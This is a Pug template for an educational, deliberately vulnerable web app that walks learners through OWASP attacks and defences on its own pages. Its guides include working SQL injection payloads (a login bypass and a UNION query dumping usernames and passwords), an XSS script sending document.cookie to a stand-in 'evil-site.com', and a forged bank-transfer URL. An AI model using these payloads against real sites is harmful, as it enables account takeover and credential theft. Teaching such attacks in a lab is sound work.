doctype html
html
  head
    title= title
    block stylesheets
      link(rel='stylesheet', href='/stylesheets/style.css')
  body
    .menu
      h1= title
      .menu-content
        div(style='display: flex; justify-content: space-between; flex-wrap: wrap;')
          div(style='text-align: center; width: 200px;')
            button#navigate(type="submit" onclick="window.location.href='/'+getQueries();") Index
          div(style='text-align: center; width: 200px;')
            button#navigate(type="submit" onclick="window.location.href='/login'+getQueries();") Log In
          div(style='text-align: center; width: 200px;')
            button#navigate(type="submit" onclick="autoLogin();") Data 
          div(style='text-align: center; width: 200px;')
            button#navigate(type="submit" onclick="window.location.href='/comments'+getQueries()") Comments    
    nav#side-menu-1
      section#side-content
        .button_bar
          .dropdown 
            .dropdown-header(onclick='toggleDropdown(this)') Attack ▼
            .dropdown-content
              #[button(type="submit" onclick="swapGuide(4, 0);") Cross-Origin Access]
              #[button(type="submit" onclick="swapGuide(3, 0);") Network Sniffing]
              #[button(type="submit" onclick="swapGuide(1, 0);") SQL Injection]
              #[button(type="submit" onclick="swapGuide(2, 0);") Cross-Site Scripting]
          section#prev-button-atk #[button(type="submit" onclick="swapGuide(-1, -1);") Prev]
          section#next-button-atk #[button(type="submit" onclick="swapGuide(-1, 1);") Next]
        p#attack-content Choose a potential Attack to get started.<br><br>The following OWASP vulnerabilities are compromised with attacks as listed:<br><br>-- A01 Broken Access-Control is compromised using <u>Cross-Origin Access</u> Attack that takes advantage of misconfigured CORS.<br><br>-- A02 Cryptographic Failures is compromised by <u>Network Sniffing</u> for sensitive unencrypted information.<br><br>-- A03 Injection vulnerabilities can be leveraged to do <u>SQL Injection</u> or <u>Cross-Site Scripting (XSS)</u>.
    nav#side-menu-2
      section#side-content
        .button_bar
          .dropdown 
            .dropdown-header(onclick='toggleDropdown(this)') Defence ▼
            .dropdown-content
              #[button(type="submit" onclick="swapGuide(1, 0);") Encryption]
              #[button(type="submit" onclick="swapGuide(2, 0);") Input Safety]
              #[button(type="submit" onclick="swapGuide(3, 0);") Referral Safety]
          section#prev-button-def #[button(type="submit" onclick="swapGuide(-1, -1);") Prev]
          section#next-button-def #[button(type="submit" onclick="swapGuide(-1, 1);") Next]
        p#defence-content Choose a Defensive Method to get started.<br><br>The following are the possible defences:<br><br>Encryption<br>-- 1. Hashing<br>-- 2. HTTPS<br><br>Input Safety<br>-- 1. Sanitisation<br>-- 2. Encoding<br><br>Referral Safety<br>-- 1. Limited URLs<br>-- 2. Configured CORS
    <br>
    section#main-content
      div(style='display: flex; justify-content: space-between; flex-wrap: wrap;')
        div: button#side-menu-toggle-1 Attack
        div(style='text-align: center; width: 150px;')
          label.switch
            if p.charAt(0)=='0'
              input(type="range" min="0" max="2" step="1" value="0" class="slider" onchange="setEncryption(this.value);")
            else if p.charAt(0)=='1'
              input(type="range" min="0" max="2" step="1" value="1" class="slider" onchange="setEncryption(this.value);")
            else 
              input(type="range" min="0" max="2" step="1" value="2" class="slider" onchange="setEncryption(this.value);")
            span.slider.round Encryption
        div(style='text-align: center; width: 150px;')
          label.switch
            if p.charAt(1)=='0'
              input(type="range" min="0" max="2" step="1" value="0" class="slider" onchange="setInputSafety(this.value);")
            else if p.charAt(1)=='1'
              input(type="range" min="0" max="2" step="1" value="1" class="slider" onchange="setInputSafety(this.value);")
            else 
              input(type="range" min="0" max="2" step="1" value="2" class="slider" onchange="setInputSafety(this.value);")
            span.slider.round Input Safety
        div(style='text-align: center; width: 150px;')
          label.switch
            if p.charAt(2)=='0'
              input(type="range" min="0" max="2" step="1" value="0" class="slider" onchange="setUrlLv(this.value);")
            else if p.charAt(2)=='1'
              input(type="range" min="0" max="2" step="1" value="1" class="slider" onchange="setUrlLv(this.value);")
            else 
              input(type="range" min="0" max="2" step="1" value="2" class="slider" onchange="setUrlLv(this.value);")
            span.slider.round Referral Safety
        div
      button#side-menu-toggle-2 Defense 
      p Welcome to Flo's Stretch Project. Here we study the vulnerabilities of websites and how to mitigate them.
      p When making web applications, we can expose ourselves to many vulnerabilities that an attacker can exploit. Attackers might wish to leverage such a weak spot in order to see sensitive user information, manipulate stored data, or break our system - we need to prevent this. It's <u>common mistakes</u> that lead to such exploit opportunities, so by being aware of these falters <b>you</b> can make sure your website is safe!
      p The OWASP Top 10 is a well researched and applied consensus of the common issues. On this site we focus on the Top 3 on the OWASP list. Included are guides to demonstrate how an attacker might act, and how defences against such attacks should be employed.
      <p> -- A01: Broken Access Control --<br>&nbsp; Permission policies decide who can access what. If misconfigured then attackers can gain access they should not have.<br>&nbsp;&nbsp;&nbsp; + CORS misconfiguration can allow access from untrusted origin to force alternative user action<br>&nbsp;&nbsp;&nbsp; + Modified URL can tamper with Access Control checks</p>
      <p> -- A02: Cryptographic Failure --<br>&nbsp; Data that falls under GDPR privacy law must be protected from being seen or maliciously changed, especially in transit.<br>&nbsp;&nbsp;&nbsp; + Passwords require the safest of transmission, particularly cryptographic hashes that cannot be reversed<br>&nbsp;&nbsp;&nbsp; + Data should only be traded between authenticated sources, and encrypted with TLS in between</p>
      <p> -- A03: Injection --<br>&nbsp; Hostile inputs that are used directly without validation can be used to extract or damage data.<br>&nbsp;&nbsp;&nbsp; + Inputs used in SQL queries can, if not validated, context-escape to inject their own code<br>&nbsp;&nbsp;&nbsp; + HTML can have scripts injected into it to act on the front end, these must be checked</p>

      p
      p
      p 
      p If any breakages occur to the data, click #[button#navigate(type="submit" onclick="window.location.href='/rebuild'+getQueries();") here] to rebuild the database.
    script.
      window.onload = function() {
        help = parseInt(#{h.charAt(0)});
        module = parseInt(#{h.charAt(1)});
        page = parseInt(#{h.charAt(2)});
        if (module == 0) { page = 0; }
        EncryptLv = parseInt(#{p.charAt(0)});
        InSafeLv = parseInt(#{p.charAt(1)});
        UrlSafeLv = parseInt(#{p.charAt(2)});
        refreshProtections();
        document.getElementById("prev-button-atk").style.display = 'none';
        document.getElementById("next-button-atk").style.display = 'none';
        document.getElementById("prev-button-def").style.display = 'none';
        document.getElementById("next-button-def").style.display = 'none';
        if (help) {
          // upon reload the help box stays open by updating it with this element
          document.getElementById('side-menu-1').classList.add('notransition');
          document.getElementById('side-menu-2').classList.add('notransition');
          document.getElementById('main-content').classList.add('notransition');
          see_help(help);
          document.getElementById('side-menu-1').offsetHeight;
          document.getElementById('side-menu-1').classList.remove('notransition');
          document.getElementById('side-menu-2').offsetHeight;
          document.getElementById('side-menu-2').classList.remove('notransition');
          document.getElementById('main-content').offsetHeight;
          document.getElementById('main-content').classList.remove('notransition');

          var openPage = page;
          swapGuide(module, 0);
          swapGuide(-1, openPage);
        }
      };

      function autoLogin() {
        if (UrlSafeLv >= 1) {
          window.location.href='/data'+getQueries()+'&s=';
        } else {
          window.location.href='/data'+getQueries()+'&s=&i=&g=';
        }
      }
      function flip_help(h) {
        if (help == 0 || help != h){
          help = h;
        } else {
          help = 0;
        }
        refreshProtections();
      }
      function setEncryption(eLevel) {
        EncryptLv = eLevel;
        refreshProtections();
      }
      function setInputSafety(iLevel) {
        InSafeLv = iLevel;
        refreshProtections();
      }
      function setUrlLv(urlLevel) {
        UrlSafeLv = urlLevel;
        refreshProtections();
      }

      function refreshProtections() {
        document.cookie = 'HelpOn=' + help.toString() + module.toString() + page.toString() + '; path=/';
        document.cookie = 'Protections=' + EncryptLv.toString() + InSafeLv.toString() + UrlSafeLv.toString() + '; path=/';
        document.cookie = 'GenreId=0; path=/';
        document.cookie = 'ItemNum=0; path=/';
      }
      function getQueries() {
        return '?p=' + EncryptLv.toString() + InSafeLv.toString() + UrlSafeLv.toString() + '&h=' + help.toString() + module.toString() + page.toString();
      }

      function see_help() {
        var menu1 = document.getElementById('side-menu-1');
        var menu2 = document.getElementById('side-menu-2');
        var mainContent = document.getElementById('main-content');
        if (help==0) {
          menu1.style.left = '-300px';
          menu2.style.left = '-300px';
          mainContent.style.marginLeft = '20px';
          document.getElementById('side-menu-toggle-1').style.border = 'none';
          document.getElementById('side-menu-toggle-2').style.border = 'none';
        } else if (help==1) {
          menu1.style.left = '0px';
          menu2.style.left = '-300px';
          mainContent.style.marginLeft = '320px';
          document.getElementById('side-menu-toggle-1').style.border = 'solid';
          document.getElementById('side-menu-toggle-2').style.border = 'none';
        } else if (help==2) {
          menu1.style.left = '-300px';
          menu2.style.left = '0px';
          mainContent.style.marginLeft = '320px';
          document.getElementById('side-menu-toggle-1').style.border = 'none';
          document.getElementById('side-menu-toggle-2').style.border = 'solid';
        }
      }
      document.getElementById('side-menu-toggle-1').addEventListener('click', function() {
        tempHelp = help;
        help = 2; swapGuide(0, 0);  // clear defence page iff was open
        help = tempHelp;
        flip_help(1);
        see_help();
      });
      document.getElementById('side-menu-toggle-2').addEventListener('click', function() {
        tempHelp = help;
        help = 1; swapGuide(0, 0);  // clear attack page iff was open
        help = tempHelp;
        flip_help(2);
        see_help();
      }); 

      function copyElementToClipboard() {
        var copyText = document.getElementById("textToCopy");
        var textarea = document.createElement("textarea");
        textarea.value = copyText.value;
        document.body.appendChild(textarea);
        textarea.select();
        document.execCommand("copy");
        document.body.removeChild(textarea);
      }
      function swapGuide(new_module, page_swap) {
        if (new_module != -1) {
          module = new_module;
          page = 0;
        } else {
          page += page_swap;
        }
        if (help == 1) {
          let content = document.getElementById("attack-content");
          //content.innerHTML = module.toString() + page.toString();
          if (module == 0) {
            document.getElementById("prev-button-atk").style.display = 'none';
            document.getElementById("next-button-atk").style.display = 'none';
            content.innerHTML = 'Choose a potential Attack to get started.<br><br>The following OWASP vulnerabilities are compromised with attacks as listed:<br><br>-- A01 Broken Access-Control is compromised using <u>Cross-Origin Access</u> Attack that takes advantage of misconfigured CORS.<br><br>-- A02 Cryptographic Failures is compromised by <u>Network Sniffing</u> for sensitive unencrypted information.<br><br>-- A03 Injection vulnerabilities can be leveraged to do <u>SQL Injection</u> or <u>Cross-Site Scripting (XSS)</u>.';
          } else if (module == 1) {
            if (page == 0) {
              document.getElementById("prev-button-atk").style.display = 'none';
              document.getElementById("next-button-atk").style.display = 'block';
              content.innerHTML = '-->SQL Injection 0<br><br>Many websites store data in Databases (DBs), from which data is retrieved using a language called SQL. On /login for example, entered username & password are used in a <u><b>query</b></u> that compares them to stored users in the DB. <br><br>By weaponising our input, we can trick the DB into executing our own code using a technique called SQL Injection. <br><br>In this guide we will investigate the steps of such an attack, including the process of learning if the website is <b>susceptible</b> to SQL Injection, how to enter our code, and what code we can enter.';
            } else if (page == 1) {
              document.getElementById("prev-button-atk").style.display = 'block';
              document.getElementById("next-button-atk").style.display = 'block';
              content.innerHTML = "-->SQL Injection 1<br><br>In order to do SQL Injection, a website has to be specifically vulnerable and cannot do Input Sanitisation or Input Encoding (go check out their sections in Defence for why). On this step, we are going to be testing the website to see if it is vulnerable to an attack.<br><br>Recall that the entered username and password are placed into a SQL query, in particular if you entered Jane then the SQL Query would ask if user='Jane'. Note that Jane is put into <u>quotation marks</u> - this will always be the case in an SQL Query.<br><br>This begs the question - if we entered our own quotation mark ('), what would occur, as the query would now include user=' ' '? As it happens, if there are protections like Input Sanitisation then nothing will happen, but if there are not then we will receive an error!! Try it out, turning on and off Sanitisation, to prove this.";
            } else if (page == 2) {
              document.getElementById("prev-button-atk").style.display = 'block';
              document.getElementById("next-button-atk").style.display = 'block';
              content.innerHTML = "-->SQL Injection 2<br><br>The receipt of an error tells us that potentially harmful inputs are <u>not</u> dealt with, and therefore SQL Injection is a possibility.<br><br> The next step is to figure out how to inject some SQL code.<br><br>The reason a quotation mark causes error is because when a quote is opened it must be subsequently closed. What we have done by entering the mark to get user=' ' ' is that now <b>our</b> quote (the middle one) closes the first quote, leaving the third quote on its own, hence the error.<br><br>However, by closing the first quote, the space before the third quote will be entered into the query as <u>SQL Code</u>. Additionally, if we comment out the third quotation mark then we can get rid of the former error. This can be done using a hash (#).<br><br>To sum up, this means if we enter a quotation mark at the start, and a hash at the end, we can enter SQL code in between.";
            } else if (page == 3) {
              document.getElementById("prev-button-atk").style.display = 'block';
              document.getElementById("next-button-atk").style.display = 'block';
              document.getElementById("textToCopy").value = "' OR TRUE #";
              content.innerHTML = "-->SQL Injection 3<br><br>If we start our input with a quotation mark, we can start writing SQL code. If we end our input with a hash, we can comment out the remaining SQL so the website focuses on our injected code which we can put in between. <br><br>In the case of the /login page, we can use this to forcibly log us in to someone else’s account. First, we need to make some deductions on the format of the current query, so we can effectively manipulate it to our advantage.<br><br>We know our entered username is placed directly into the existing query, this means as the website reads through the DB of users it is comparing each of their usernames to what we entered. This will be formatted using the syntax WHERE user=[our input], where a true condition will log us in.<br><br>We can therefore force the condition to always be true with a simple <br><br> ' OR TRUE # <button onclick='copyElementToClipboard()'>Copy text</button>";
            } else if (page == 4) {
              document.getElementById("prev-button-atk").style.display = 'block';
              document.getElementById("next-button-atk").style.display = 'block';
              document.getElementById("textToCopy").value = "' LIMIT 1) #";
              content.innerHTML = "-->SQL Injection 4<br><br>Let’s increase our scope to some more advanced SQL, moving over to the /data page, where once again entering a quotation mark into the search bar reveals susceptibility to SQL Injection. Try entering '# like before, however, this does not cancel out the error like before!!<br><br>SQL Queries can be written in many different ways and Injection formatting tends to require a lot of trial and error. In this case, the query is embedded in brackets and we actually need to enter ')# to prevent the error.<br><br>With this in mind we need to inject our code a little differently, accounting for this change. For example, try entering <br><br>' LIMIT 1) # <button onclick='copyElementToClipboard()'>Copy text</button>";
            } else if (page == 5) {
              document.getElementById("prev-button-atk").style.display = 'block';
              document.getElementById("next-button-atk").style.display = 'block';
              document.getElementById("textToCopy").value = "' LIMIT 0) UNION ALL (SELECT * FROM Users) #";
              content.innerHTML = "-->SQL Injection 5<br><br>We know now how to inject code into the /data query, we also know that what is returned is a table of data. If the website already prints one table of data to screen, can we make it print a different one?<br><br>To do this we need to empty the first table then add in data from the other table. Don’t worry too much about the technicalities but using a little advanced SQL (and the LIMIT we used in the last step), we get<br><br>' LIMIT 0) UNION ALL (SELECT * FROM Users) # <button onclick='copyElementToClipboard()'>Copy text</button> <br><br>This will throw an error, but when you execute this, pay attention to the message before proceeding to the next step.";
            } else if (page == 6) {
              document.getElementById("prev-button-atk").style.display = 'block';
              document.getElementById("next-button-atk").style.display = 'block';
              document.getElementById("textToCopy").value = "' LIMIT 0) UNION ALL (SELECT user AS title, '' AS Director, pass AS TopTwoActors, '' AS releaseDate, '' AS movieId FROM Users) #";
              content.innerHTML = "-->SQL Injection 6<br><br>Oh no, it did not work! The movies and users data don’t match appropriately to do this union. Luckily we can get around this without too much difficulty but with a bit of sleuthing. We found earlier that the Users table has two notable columns user and pass, and we can also get the column names of the movie data straight from the table shown. With this in mind we can reformat our input to match the Movies and Users tables together using<br><br>' LIMIT 0) UNION ALL (SELECT user AS title, '' AS Director, pass AS TopTwoActors, '' AS releaseDate, '' AS movieId FROM Users) # <button onclick='copyElementToClipboard()'>Copy text</button> <br><br>Note that this time it works!!";
            } else if (page == 7) {
              document.getElementById("prev-button-atk").style.display = 'block';
              document.getElementById("next-button-atk").style.display = 'none';
              content.innerHTML = '-->SQL Injection 7<br><br>Congratulations! You managed to craftily use SQL Injection to retrieve a list of users and their passwords. Try re-running the same command with Hashing on to see the difference in returned text.<br><br>Did you see how in just one simple bit of text we could gain unlawful access or reveal such sensitive information? SQL Injection can cause catastrophic damage to a system, but luckily there is a solution. If you try any of the inputs we’ve talked about, but now with Sanitisation on, you will see them no longer work!<br><br>Go read about Input Sanitisation in its respective section in Defences to learn more…';
            }
          } else if (module == 2) {
            if (page == 0) {
              document.getElementById("prev-button-atk").style.display = 'none';
              document.getElementById("next-button-atk").style.display = 'block';
              content.innerHTML = '-->Cross-Site Scripting (XSS) 0<br><br>Website’s have their data formatted using HTML markup, presenting raw text, pictures or tables. More advanced processing of this data, however, has to be done using explicit scripts, such as on the /login page hashing the password before sending it. This is done using &lt;script&gt; tags.<br><br>An attacker’s ability to add their <u>own</u> code that runs as such a script, is called Cross-Site Scripting or XSS. Malicious functionality can be embedded into a website with XSS to run for all users who visit. <br><br>Code will likely be inputted via text-entry, as we will see, which means safe handling of the text can mitigate this. For example, Input Sanitisation and Input Encoding could completely block this attack. Go check out their respective section in Defences: Input Safety.';
            } else if (page == 1) {
              document.getElementById("prev-button-atk").style.display = 'block';
              document.getElementById("next-button-atk").style.display = 'block';
              document.getElementById("textToCopy").value = decodeURIComponent('%3Cscript%3Ealert("helloworld")%3C/script%3E');
              content.innerHTML = '-->Cross-Site Scripting (XSS) 1<br><br>Before we try adding a malicious script, let’s learn how scripts might be uploaded. As mentioned, code is run between &lt;script&gt; tags, with this in mind let’s run a very simple command. On the /data page try entering the following line as a search query. <br><br>&lt;script&gt;alert("helloworld")&lt;/script&gt; <button onclick="copyElementToClipboard()">Copy text</button><br><br>The variable “searchQuery” is set to our input, which it expects to receive simple text and therefore can show plainly back to us. However, the use of the tags forces the HTML into script-mode where code can be run.';
            } else if (page == 2) {
              document.getElementById("prev-button-atk").style.display = 'block';
              document.getElementById("next-button-atk").style.display = 'block';
              document.getElementById("textToCopy").value = decodeURIComponent('%3Cscript%3Ewindow.location="https://google.com?"+document.cookie%3C/script%3E');
              content.innerHTML = '-->Cross-Site Scripting (XSS) 2<br><br>Let’s upgrade our inputted script to be more malicious, for example stealing a user’s cookies, which usually contain very important information about a user. For example, with a user’s session-cookie, an attack can acquire and use that user’s account. <br><br>We can reveal a user’s cookies by leveraging the entity “document.cookie” and sending this to our own malicious site. Similar to how the search query appears in the url, the malicious site can read the sent information, including the session-cookie. To do this we must use the script to link the user via the following<br><br>&lt;script&gt; window.location= "https://evil-site.com?"+document.cookie &lt;/script&gt; <button onclick="copyElementToClipboard()">Copy text</button>';
            }  else if (page == 3) {
              document.getElementById("prev-button-atk").style.display = 'block';
              document.getElementById("next-button-atk").style.display = 'none';
              content.innerHTML = '-->Cross-Site Scripting (XSS) 3<br><br>Now knowing what XSS attack to do, we need to find a place to deploy it. On the /login and /data pages we can input such scripts, but in these cases they will only exist for us and will not remain on the system to affect other people. We need to upload our XSS script to a place it will persist, such as the /comments page.<br><br>If you haven’t already, try using this page to add comments - first you have to log in (try entering “u1” and “p1”) then typing some text into the comment page. Now try entering the previous input we tried to here. <br><br>If you open another tab and go to the comments page, the script should still run as the added comment stays there. If you turn on Input Encoding (Input Safety lv. 2), however, the attack ceases to work. Go to the relevant section in Defences to learn why.';
            } 
          } else if (module == 3) {
            if (page == 0) {
              document.getElementById("prev-button-atk").style.display = 'none';
              document.getElementById("next-button-atk").style.display = 'block';
              content.innerHTML = '-->Network Sniffing 0<br><br>When we navigate a website, the buttons we press and choices we make are communicated back to the server. These communications can be tracked and listened to. For example, enter different queries into the /data search bar and iterate through the list - notice the queries sent through the URL.<br><br>Data sent back, if heard by potential attackers, can be used for malicious means. Information can be sent through URL queries, which is the easiest to read, but even other means like via cookies and parameters can be listened to. Only encrypting our data can stop this, which is why the site being on HTTP is required for this attack to work.';
            } else if (page == 1) {
              document.getElementById("prev-button-atk").style.display = 'block';
              document.getElementById("next-button-atk").style.display = 'block';
              content.innerHTML = '-->Network Sniffing 1<br><br>Go to the user log in page with all defences off and use “u1” and “p1” to log in. Notice, as before that both of these values appear in the URL. If we instead turn on the first level of Encryption, the password is hashed to stop it being directly read, so “p1” no longer appears in the URL. Try one more time, but this time with the first level of Referral Safety, noticing nothing appears in the URL!<br><br>If an attacker is on the same network as you, they have the opportunity to spy on your traffic, more particularly to see the data you send across the internet. This has been simulated on <a style="color: red;" href="/NetListen'+getQueries()+'">this</a> site.<br><br>Notice on this site we can see what you just did! ';
            } else if (page == 2) {
              document.getElementById("prev-button-atk").style.display = 'block';
              document.getElementById("next-button-atk").style.display = 'block';
              content.innerHTML = '-->Network Sniffing 2<br><br>On the /NetListen page there is a list of urls entered to simulate what an attacker might be able to find. There exist the plaintext username and password to be entered, which an attacker could easily read and input themselves to gain access to someone else’s account.<br><br>Next see the version where a Hash is used, with u1/f6455… where the password can no longer be easily read. This does not, however, mean it is intrinsically safe from attackers. Go visit <a style="color: red;" href="https://crackstation.net/">crackstation.net</a> and enter this hash - a simple rainbow table is able to rediscover the original password from it.<br><br>Brute forcing the password from its hash can only be done by choosing a password that would never be guessed. To check this, go visit <a style="color: red;" href="https://emn178.github.io/online-tools/sha256.html">this</a> website to hash different, increasingly complex, passwords to see what can be cracked.';
            }  else if (page == 3) {
              document.getElementById("prev-button-atk").style.display = 'block';
              document.getElementById("next-button-atk").style.display = 'none';
              content.innerHTML = '-->Network Sniffing 3<br><br>To ensure users are safe from the aforementioned attack, a good password policy should be employed such as requiring varied symbols and at least 12 characters. There are still, however, attacks that can be done, such as pass-the-hash. <br><br>If you saw another user’s username and hashed password, despite not knowing the original password, you could simply enter this into your URL as it is, rather than trying to log in via the /login interface. Try this out again using the <a style="color: red;" href="/NetListen'+getQueries()+'">NetListen</a> page. <br><br>This attack can only be stopped by sending the sensitive data via more secure means. This includes using cookies to communicate instead of URL queries, which are less easy to see and enter, and employing HTTPS.';
            }
          } else if (module == 4) {
            if (page == 0) {
              document.getElementById("prev-button-atk").style.display = 'none';
              document.getElementById("next-button-atk").style.display = 'block';
              content.innerHTML = '-->Cross-Origin Access 0<br><br>You may have noticed how buttons and links can allow you to navigate around this website. Requests are sent from the server-backend of one page, and are responded to by another, moving you across. When you move around, your cookie data is also maintained, such as for making comments. <br><br>Try logging in (e.g. entering “u1” and “p1”), our username is stored to send along with any entered comment. If we are not logged, however, no comment can be made.<br><br>Notice how the comment is sent back to the server via the URL, meaning that typing in this URL while logged in would <u>do</u> this action. Another user could enact an attack with this in mind from a remote origin like <a style="color: red;" href="/CORS'+getQueries()+'">here</a>.';
            } else if (page == 1) {
              document.getElementById("prev-button-atk").style.display = 'block';
              document.getElementById("next-button-atk").style.display = 'block';
              content.innerHTML = '-->Cross-Origin Access 1<br><br>Open the <a style="color: red;" href="/CORS'+getQueries()+'">site</a> on a separate tab and have a look at the source code (right-click, view source), noticing the button link. We are going to see how the website reacts in different cases when this button is pressed.<br><br>On the regular website, make sure you are logged out. Now on the malicious site, click the button. It will take us to the comments page but nothing will happen. Go back to the malicious site to reset.<br><br>Now try the same while logged in (try entering “u1” and “p1”), noticing this time a comment is written! This is because the website acknowledges the user as logged in (due to stored cookies) and allows the comment to action. <br><br>This attack relies on a user clicking this button while logged in, as if they are not then their session-cookie is not active. ';
            } else if (page == 2) {
              document.getElementById("prev-button-atk").style.display = 'block';
              document.getElementById("next-button-atk").style.display = 'none';
              content.innerHTML = '-->Cross-Origin Access 2<br><br>Usually requests like this are done from within the website, but as we have seen if done from an external malicious origin can be written specifically to take advantage of a user’s access. In this case, the user is forced to write a comment under their name, which could be leveraged to also publicise sensitive data. In other cases, a link like the following could be used to send money from a logged in user’s bank account.<br><br>bank.com?receive=attacker&amount=1000<br><br>This can first be blocked by simplifying our URL to stop activity like this, but more defensive procedure is required to comprehensively stop such an attack from a remote origin.<br><br>By correctly configuring our access control, such queries like this can be comprehensively stopped. In particular we must employ a Cross-Origin policy, as seen in its respective part of Defences: Referral Safety.';
            }
          }
        } else if (help == 2) {
          let content = document.getElementById("defence-content");
          if (module == 0) {
            document.getElementById("prev-button-def").style.display = 'none';
            document.getElementById("next-button-def").style.display = 'none';
            content.innerHTML = 'Choose a Defensive Method to get started.<br><br>The following are the possible defences:<br><br>Encryption<br>-- 1. Hashing<br>-- 2. HTTPS<br><br>Input Safety<br>-- 1. Sanitisation<br>-- 2. Encoding<br><br>Referral Safety<br>-- 1. Limited URLs<br>-- 2. Configured CORS';
          } else if (module == 1) {
            if (page == 0) {
              document.getElementById("prev-button-def").style.display = 'none';
              document.getElementById("next-button-def").style.display = 'block';
              content.innerHTML = '-->Encryption<br><br>When accessing our accounts and data, we like to lock things behind a username and password to maintain them as personally ours - to stop others seeing our data or changing it. When this is done online, however, our login information has to be sent over the internet to the website’s server to be checked, for our personal data to be sent over the internet back to us.<br><br>To keep this data safe in this process we <u>encrypt</u> it, meaning we transform it into an alternate form not easily deciphered by anyone else.<br><br>In this guide we will discuss two specific uses, Password Hashing and HTTPS.';
            } else if (page == 1) {
              document.getElementById("prev-button-def").style.display = 'block';
              document.getElementById("next-button-def").style.display = 'block';
              content.innerHTML = '-->Encryption - Hashing 1<br><br>As you will know if you have read through the Network Sniffing attack, if our password is in plaintext it can be easily read in transit so must be made harder to read. This must be done on the frontend <u>before</u> it is sent. There are two ways to do this transformation: Encryption or Hashing.<br><br>Encryption would turn plaintext into ciphertext using a key, for it to then be able to be decrypted via a key too, while Hashing is a one way process but does not require a key. <br><br>For passwords specifically we use a Hash as the server need only compare the password’s hash-form and it means we do not need to store any keys, which is a potential vulnerability of encryption.';
            } else if (page == 2) {
              document.getElementById("prev-button-def").style.display = 'block';
              document.getElementById("next-button-def").style.display = 'block';
              content.innerHTML = '-->Encryption - Hashing 2<br><br>There are many different types of Hash, but the most secure and commonly used for passwords is SHA-256. While building our own site, we must make sure to avoid weak protocols like SHA-1 which is classified as insecure due to its lack of collision resistance, meaning entering a different password has a high chance of producing the same hash. <br><br>The only way to decipher a password from the secure SHA-256 is brute force, meaning in many cases an attacker will not be able to guess a password even if they have access to its hash. However, a weak password can be brute forced in a short time and is vulnerable to such a technique. To check this, go visit <a style="color: red;" href="https://emn178.github.io/online-tools/sha256.html">this</a> website to hash different, increasingly complex, passwords to see what can be cracked when entered into the cracker <a style="color: red;" href="https://crackstation.net">here</a>.';
            } else if (page == 3) {
              document.getElementById("prev-button-def").style.display = 'block';
              document.getElementById("next-button-def").style.display = 'block';
              content.innerHTML = '-->Encryption - HTTPS 1<br><br>HTTP is the protocol for the application layer of the internet, where information from a client is encoded in preparation for its transmission and where received data can decode to be rendered. Making this process fully secure requires the data to be <u>encrypted</u> such that it can only be undone by the desired receiver. This is employed by HTTPS. <br><br>When a client and server connect, they agree upon a method and key for encryption to employ. With this done, any potential listeners should not be able to make out any information so our password and data are safe.<br><br>Old versions of HTTPS used SSL, but now the more secure TLS is used.';
            } else if (page == 4) {
              document.getElementById("prev-button-def").style.display = 'block';
              document.getElementById("next-button-def").style.display = 'none';
              content.innerHTML = '-->Encryption - HTTPS 2<br><br>To ensure the secure HTTPS connection is only ever established with a trustworthy server, the server is authenticated to the user, just as the user authenticates themselves to the server. This is done using a certificate from a certificate authority (CA).<br><br>Any valid non-malicious site should get a certificate as HTTPS is the norm. This requirement is enforced by browsers’ configuration to suggest HTTP websites below HTTPS.<br><br>One can get a Self-Signed Certificate with openssl but this is only useful for local environments. For publicly accessible domains, LetsEncrypt provides a <u>free</u> service to secure your site.';
            }
          } else if (module == 2) {
            if (page == 0) {
              document.getElementById("prev-button-def").style.display = 'none';
              document.getElementById("next-button-def").style.display = 'block';
              content.innerHTML = '-->Input Safety<br><br>If you tried out the SQL Injection or Cross-Site Scripting attacks, you would have seen that text entry can be leveraged by an attacker to enter strings that can cause unintended action, often maliciously.<br><br>We can remove all text inputs, however this may reduce functionality, so where possible we should <u>limit</u> text input by instead using buttons, such as we see for the page scrolling buttons on /data. In many cases, like the search, text input is still necessary.<br><br>These necessary text inputs need their own protections, where we analyse the input to check for possible negative effects. This constitutes the steps of Input Safety.';
            } else if (page == 1) {
              document.getElementById("prev-button-def").style.display = 'block';
              document.getElementById("next-button-def").style.display = 'block';
              content.innerHTML = '-->Input Safety - Sanitsation 1<br><br>There are many characters that we have seen that can cause erroneous behaviour. For SQL Injection we saw quotation marks can be used to allow injection of SQL code, for XSS we saw scripts are used and are embedded in < arrows. Input Sanitisation is the process of filtering out these potentially harmful symbols to guarantee they cannot be used.<br><br>Try this out by turning Input Safety to the first level and inputting text to /data with some of these characters. Notice that the used search query is not the same as the one entered.';
            } else if (page == 2) {
              document.getElementById("prev-button-def").style.display = 'block';
              document.getElementById("next-button-def").style.display = 'block';
              content.innerHTML = '-->Input Safety - Sanitsation 2<br><br>These potentially harmful symbols do, of course, have real use. Eliminating them in all cases also inevitably applies to times when they are not used maliciously. In these such cases, the genuine and non-malicious input is transformed and this can damage the availability of functions for the user.<br><br>For example, on /data with all safety off, try searching “face/“ - we see a single film as asked for. Due to a slash’s use in traversing directories we might protect against it, so with Sanitisation on when we enter “face/“ we actually search for “face”.<br><br>Deciding on what we sanitise requires a lot of situational nuance and is a difficult process. Luckily there is a better technique.';
            } else if (page == 3) {
              document.getElementById("prev-button-def").style.display = 'block';
              document.getElementById("next-button-def").style.display = 'block';
              content.innerHTML = '-->Input Safety - Encoding 1<br><br>Instead of getting rid of potentially harmful characters, we can upgrade our methods to just remove the characters functionality instead. This technique forces text to remain as text by representing it in a different form, more specifically an Encoding.<br><br>When we encode a character such as &lt;script&gt; will start a script environment, whereas the encoded form %3Cscript%3E is just a bundle of characters and can <u>only</u> be read in text form. <br><br>This is more advanced than Sanitisation as all characters are kept. To demonstrate this, turn Input Safety to the second level and search for “face/“ again - notice the input string is correctly used!';
            } else if (page == 4) {
              document.getElementById("prev-button-def").style.display = 'block';
              document.getElementById("next-button-def").style.display = 'none';
              content.innerHTML = '-->Input Safety - Encoding 2<br><br>To be safe using inputted text at all subsequent stages, it has to be encoded as early as possible. If we can encode it on the frontend upon input, we ensure that its subsequent use on the webpage will not run a script, while also stopping it from being able to be used for SQL Injection when passed to the backend. However, for these methods, different encodings must be applied.<br><br>- For the mentioned tasks, HTML encoding stops &lt;script&gt; from running a script<br>- MySQL includes functionality to encode text on the backend before inserting into a query<br>- URL encoding allows safe passing of queries and non-erroneous referencing policies.';
            }
          } else if (module == 3) {
            if (page == 0) {
              document.getElementById("prev-button-def").style.display = 'none';
              document.getElementById("next-button-def").style.display = 'block';
